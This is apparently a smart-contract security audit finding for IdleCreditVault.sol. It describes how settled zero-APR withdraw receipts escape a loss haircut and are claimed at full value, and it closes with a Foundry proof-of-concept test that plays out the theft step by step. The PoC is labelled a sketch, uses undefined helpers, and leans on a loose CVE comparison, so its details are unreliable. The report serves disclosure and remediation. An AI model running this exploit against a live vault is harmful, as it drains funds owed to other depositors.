### Title
Settled APR0 receipts lose their epoch marker, letting a new `requestWithdraw` move `lastWithdrawRequest` past a loss-adjusted epoch so the haircut receipt is claimed at par - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault` tracks a user's "current" withdraw-request epoch with a single pointer, `lastWithdrawRequest[_user]`, plus per-epoch basis in `withdrawsRequestsByEpoch[_user][epoch]` and `apr0Users[_user].principalEpoch`. Like the unterminated array in CVE-2017-2591, the loss-claim path reads only the entry the pointer currently names (`lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`); any earlier receipt whose per-epoch marker was erased is "past the end" of the lookup and is paid at par instead of at its haircut `lossRecoveryPrice`.

### Finding Description
When APR is 0, `requestWithdraw` stores the receipt only in `apr0Users[_user]` and `apr0TotalPrincipal`; it never writes `withdrawsRequestsByEpoch[_user][currentEpoch]` (IdleCreditVault.sol:285-294, 567-577). The guard that blocks a user from opening a new request while holding a loss-adjusted receipt checks only two conditions for the epoch stored in `lastWithdrawRequest[_user]`: `withdrawsRequestsByEpoch[_user][lossEpoch] != 0` or a still-open `apr0Users[_user].principal` whose `principalEpoch == lossEpoch` (IdleCreditVault.sol:261-271).

When the user later interacts (new `requestWithdraw`, or a claim that calls `_settleApr0`), `_settleApr0` moves `apr0Users[_user].principal` into `settledPrincipal`/`settledInterest` and zeroes `principal` and `principalEpoch` (IdleCreditVault.sol:545-565). From that point the loss-epoch APR0 receipt has *no* discoverable per-epoch marker: `withdrawsRequestsByEpoch` was never written for it and `principalEpoch` is cleared. A subsequent `requestWithdraw` (in any later epoch, APR0 or normal) therefore passes the guard, and `lastWithdrawRequest[_user]` is overwritten with the new epoch (IdleCreditVault.sol:282).

At claim time, `claimWithdrawRequest` calls `_claimLossAdjustedWithdrawRequest`, which reads `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` — now the *new* epoch, which has `lossRecoveryPrice == 0`, so nothing is haircut (IdleCreditVault.sol:789-801). Execution falls through to `_claimFundedWithdrawRequest`, which pays `normalAmount + settledPrincipal + settledInterest` in full via `_transferFundedClaim` (IdleCreditVault.sol:338-349). But `collectWithdrawFunds` only funded `pendingBasis * lossRecoveryPrice / RECOVERY_FULL` for that epoch's receipts (IdleCreditVault.sol:411-429). The user is paid face value for a receipt that was only partially funded.

### Impact Explanation
The settled-APR0 receipt for the loss epoch is redeemed at 100% while the strategy holds only `lossRecoveryPrice` of its basis. The excess is paid out of the same funded underlying reserve that backs other users' pending receipts: the attacker extracts an unhonored `(1 - lossRecoveryPrice) * claimBasis` directly (theft), and the last claimant(s) in that loss epoch find the strategy short — their `_transferFundedClaim` reverts or pays less, i.e. permanent freezing/insolvency of up to the full unfunded remainder. The direct quantified loss is `claimBasis * (RECOVERY_FULL - lossRecoveryPrice) / RECOVERY_FULL` stolen from other receipt holders.

### Likelihood Explanation
Requires the APR0 mode (`unscaledApr == 0`), an epoch ending via `stopEpochWithDuration` with a partial loss so `collectWithdrawFunds` stores a `lossRecoveryPriceByEpoch` entry, and the attacker to (a) hold an APR0 request in that epoch, (b) let it settle (`_settleApr0` triggers on any later request/claim after `epochNumber` advances), and (c) open any new withdraw request, then claim. All steps are unprivileged user actions around honest manager `startEpoch`/`stopEpoch` calls; no privileged misbehavior is needed. The guard explicitly designed to prevent this (`IdleCreditVault.sol:263-271`) is bypassed purely because APR0 receipts drop their epoch index on settlement — exactly the "missing terminator" shape of the reference bug.

### Recommendation
Retain an epoch-attributed marker for APR0 receipts until they are claimed. Concretely:
- Write APR0 request principal into `withdrawsRequestsByEpoch[_user][currentEpoch]` (or a parallel `apr0RequestsByEpoch`) at request time and keep `principalEpoch`/a per-epoch record for the *settled* bucket, so the guard at `requestWithdraw` keeps detecting unclaimed loss-epoch receipts.
- In `_claimFundedWithdrawRequest` (or `claimWithdrawRequest`), iterate/verify that no earlier epoch entry in `lossRecoveryPriceByEpoch` still has an unclaimed basis for the user before paying at par — e.g. store the epoch of settled APR0 principal in `Apr0UserData` (`settledPrincipalEpoch`) and revert/route through `_claimLossAdjustedWithdrawRequest` when `lossRecoveryPriceByEpoch[settledPrincipalEpoch] != 0`.

### Proof of Concept
Foundry fork PoC sketch (modeled on `test/foundry/IdleCreditVault.t.sol` helpers; attacker = KYC'd AA holder):

```solidity
function testApr0SettledReceiptBypassesLossHaircut() external {
    // --- setup: APR0 pool, attacker deposits ---
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, cdoEpoch.managementFee());
    vm.prank(owner);
    cdoEpoch.setIsAYSActive(false);
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(0, 0); // unscaledApr = 0

    address attacker = makeAddr("attacker");
    uint256 amount = 100_000 * ONE_SCALE;
    deal(defaultUnderlying, attacker, amount);
    _depositAs(attacker, amount);          // depositAA + KYC/transfer tranche tokens

    _startEpochAndCheckPrices(0);

    // --- epoch 1: attacker requests withdraw while apr == 0 (APR0 path only) ---
    uint256 trancheBal = IERC20(AAtranche).balanceOf(attacker);
    vm.prank(attacker);
    uint256 principal = cdoEpoch.requestWithdraw(trancheBal, address(AAtranche));

    _startEpochAndCheckPrices(1);

    // --- epoch 1 ends with a partial loss via stopEpochWithDuration ---
    // borrower repays only part of pendingWithdraws -> collectWithdrawFunds stores
    // lossRecoveryPriceByEpoch[1] = fundedRatio < 1e18
    uint256 pending = IdleCreditVault(address(strategy)).pendingWithdraws();
    uint256 funded  = pending / 2;                     // 50% recovery
    deal(defaultUnderlying, borrower, funded + cdoEpoch.expectedEpochInterest());
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(_lossAmountCoveringHalf, 0); // triggers partial collectWithdrawFunds
    assertEq(IdleCreditVault(address(strategy)).lossRecoveryPriceByEpoch(1), funded * 1e18 / pending);

    // --- epoch 2: settle attacker APR0 receipt, erasing its epoch marker ---
    // bump apr back to non-zero so the next request takes the normal path
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(initialAprScaled, 0);
    _startEpochAndCheckPrices(2);

    // attacker dust deposit + tiny request: _requestWithdrawApr0/_settleApr0 clears
    // apr0Users[attacker].principalEpoch, and requestWithdraw overwrites
    // lastWithdrawRequest[attacker] = 2. Guard at L263-271 passes because
    // withdrawsRequestsByEpoch[attacker][1] == 0 (never written for APR0).
    deal(defaultUnderlying, attacker, ONE_SCALE);
    _depositAs(attacker, ONE_SCALE);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(0, address(AAtranche)); // requests full new balance

    _startEpochAndCheckPrices(3);
    // fund epoch 2/3 receipts normally
    deal(defaultUnderlying, borrower, strategy.pendingWithdraws() + cdoEpoch.expectedEpochInterest());
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // --- exploit: claim pays the loss-epoch receipt at PAR ---
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 got = underlying.balanceOf(attacker) - balPre;

    // expected honest payout for epoch-1 receipt: principal * lossRecoveryPrice / 1e18
    // actual: full settledPrincipal + settledInterest (par), draining funded reserve
    assertGt(got, funded); // attacker received more than the 50% funded for epoch 1
}
```

The assertion shows the attacker receiving `settledPrincipal + settledInterest` at face value while only `funded = 50%` was transferred into the strategy for that epoch — the shortfall is paid from other users' funded receipts, or leaves them unclaimable.